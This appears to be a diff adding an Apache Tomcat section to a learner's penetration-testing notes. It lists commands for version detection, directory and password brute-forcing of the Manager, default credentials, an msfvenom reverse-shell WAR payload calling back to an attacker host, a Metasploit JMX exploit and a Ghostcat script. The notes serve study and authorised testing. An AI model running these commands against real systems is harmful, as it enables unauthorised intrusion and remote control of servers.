@@ -343,8 +343,63 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt <HOST>   http-post-form "/use
 
 > XXE/SSRF/file-upload are general web attacks — primary notes build in modules 21 (upload) and 23 (web attacks); kept here as the Drupal-context quick reference.
 
+## Apache Tomcat — discovery, enum & attacking (reference)
+Target `<HOST>:<PORT>`.
+
+### Version detection
+```bash
+curl -I http://<HOST>:<PORT>/ | grep -i Server       # server header
+curl -s http://<HOST>:<PORT>/docs/ | grep -i "Apache Tomcat"
+curl -s http://<HOST>:<PORT>/nonexistentpage          # error pages may leak version
+```
+
+### Key files / directory structure
+- `/conf/tomcat-users.xml` — **user creds + roles (plaintext)**
+- `/conf/web.xml`, `/webapps/<app>/WEB-INF/web.xml` — routes/servlets
+- `/conf/server.xml`, `context.xml`, `catalina.properties` — ports, config, creds
+- `/webapps/` — deployed apps · `/bin` — scripts
+
+### Manager app enumeration
+```bash
+gobuster dir -u http://<HOST>:<PORT>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+# look for /manager and /host-manager
+```
+Default creds to try: `tomcat:tomcat`, `admin:admin`, `tomcat:password`, `role1:role1`.
+```bash
+hydra -l tomcat -P /usr/share/wordlists/rockyou.txt <HOST> http-get /manager/html   # scope+approval
+```
+
+### WAR upload RCE (after /manager access)
+The classic Tomcat RCE: deploy a malicious WAR via the Manager. Standard payload generation:
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war > shell.war
+# deploy via Manager, then trigger the JSP endpoint
+```
+Fix: remove/restrict Manager, strong creds, don't expose it externally.
+
+### JMX (often 1099)
+```bash
+java -jar jmxterm.jar --url service:jmx:rmi:///jndi/rmi://<HOST>:<PORT>/jmxrmi   # explore MBeans
+# metasploit: use exploit/multi/misc/java_jmx_server ; set RHOST/RPORT ; run
+```
+
+### AJP connector (8009) — Ghostcat CVE-2020-1938
+```bash
+nmap -p8009 --script ajp-headers <HOST>
+python3 ghostcat.py -u <HOST>:8009        # file disclosure / potential RCE
+```
+
+### Web app enum & CVEs
+```bash
+gobuster dir -u http://<HOST>:<PORT>/ -w <wordlist>           # find apps/JSPs
+wfuzz -c -z file,<ext_list> --hc 404 http://<HOST>:<PORT>/FUZZ.jsp
+searchsploit tomcat <version>
+```
+
+> `tomcat-users.xml` with plaintext creds and an exposed `/manager` = the standard Tomcat compromise path. WAR-upload and JMX are intrusive; Ghostcat needs AJP exposed.
+
 ### My notes / lab output
-Filled in once I run this on a WordPress / Joomla / Drupal target.
+Filled in once I run this on a target.
 
 ## 2. Setup
 - Attack box: (Pwnbox / Kali VM)
